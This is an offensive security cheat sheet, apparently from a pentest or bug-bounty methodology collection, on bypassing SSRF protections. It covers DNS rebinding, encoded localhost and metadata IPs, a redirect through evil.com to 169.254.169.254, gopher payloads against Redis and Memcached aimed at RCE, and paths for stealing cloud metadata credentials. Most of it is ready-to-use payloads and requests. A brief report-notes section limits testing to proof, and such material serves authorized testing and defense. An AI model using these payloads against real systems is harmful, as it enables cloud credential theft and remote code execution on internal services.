# DNS Rebinding & SSRF Filter-Bypass Chains

**What it is:** Defeat SSRF allowlists that validate the hostname once but connect later (TOCTOU on DNS), plus advanced SSRF reach tricks.

## DNS rebinding (TOCTOU on resolution)
App resolves `attacker.com` → sees public IP → passes the check. Seconds later it connects; your DNS now answers `127.0.0.1`/`169.254.169.254`.
- [ ] Serve a low-TTL record flipping public → internal (`rebind.network`, `rbndr`, own auth DNS).
- [ ] Trigger a fetch, race the re-resolution window.
```http
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://7f000001.rbndr.us:80/latest/meta-data/"}
```

## Alternate-IP encodings (single-check bypass)
```
http://127.0.0.1        http://2130706433/        (decimal)
http://0x7f000001/      http://0177.0.0.1/        (hex / octal)
http://127.1/           http://[::1]/  http://[::ffff:127.0.0.1]/
http://127.0.0.1.nip.io/   http://localtest.me/
```

## Redirect-based bypass
Allowlist checks your URL (public), your server 302s to internal:
```http
GET /fetch?url=https://evil.com/redirect HTTP/1.1
```
`evil.com/redirect` → `Location: http://169.254.169.254/...`. Test `301/302/307` (307 preserves method+body).

## Protocol smuggling (gopher → internal service RCE)
```
gopher://127.0.0.1:6379/_SET%20key%20val%0d%0a...   # Redis
gopher://127.0.0.1:11211/                            # Memcached
dict://127.0.0.1:6379/info
```
Use `gopherus` to build Redis/FastCGI/SMTP payloads → RCE on the internal service.

## Cloud metadata (per provider)
```
AWS  http://169.254.169.254/latest/meta-data/iam/security-credentials/  (IMDSv2? need PUT token)
GCP  http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
Azure http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata:true)
Alibaba http://100.100.100.200/latest/meta-data/
```

## Blind SSRF value
Even no-response SSRF → internal port scan (timing), reach webhooks, hit metadata via error/OOB, trigger internal admin actions.

## Impact
Cloud cred theft → account takeover, internal RCE via gopher, allowlist bypass.

## Report notes
Prove with a Collaborator hit from the server IP or benign metadata path. For rebinding, show the check passing then the internal connection. No live IAM cred pivoting beyond proof.

## Deep cuts — win the rebind race & widen reach
- [ ] **Multi-answer / round-robin DNS:** serve two A records (public + `127.0.0.1`); the validator hits the public one, the fetch may pick the internal — no TTL race needed.
- [ ] **TTL=0 + cache-pin bypass:** browsers/langs pin DNS for a minimum; use `singularity` (attack framework) which handles pinning, or force re-resolution via connection reset/`Connection: close`.
- [ ] **TOCTOU tightening:** add latency between check and fetch (large redirect chain, slow first byte) so your DNS flips inside the window; fire many parallel attempts.
- [ ] **More IP encodings:** `0.0.0.0` (→ localhost on Linux), `[::]`, `[::ffff:169.254.169.254]`, IPv6 zone-id, mixed `0x7f.1`, `127.000.000.1`, `2852039166` (decimal for 169.254.169.254), and `169.254.169.254` aliases (`instance-data`, `metadata`).
- [ ] **Redirect method preservation:** `307`/`308` keep method+body (POST SSRF, gopher-ish); `301/302` for GET. Chain open-redirect on an allowlisted host (`05-client-side/05`).
- [ ] **Scheme downgrade/upgrade:** `https`→`http` after redirect, or `http`→`gopher`/`dict`/`file` if the fetch lib follows arbitrary schemes.
- [ ] **Blind-SSRF amplifiers:** internal port scan by timing/status, hit unauthenticated internal admin panels (Jenkins/Actuator/Consul/etcd/Kibana/Docker `:2375`), and trigger internal state-changing actions.
- [ ] **Cloud reach map:** k8s `kubernetes.default.svc`, kubelet `:10250/run` (RCE), cloud-link-local variants per provider (`03-injection/06` for the full metadata list).

## Tools
`SSRFmap`, `gopherus`, `interactsh`, `rbndr`/`rebind`/`singularity` DNS, `nip.io`/`sslip.io`.
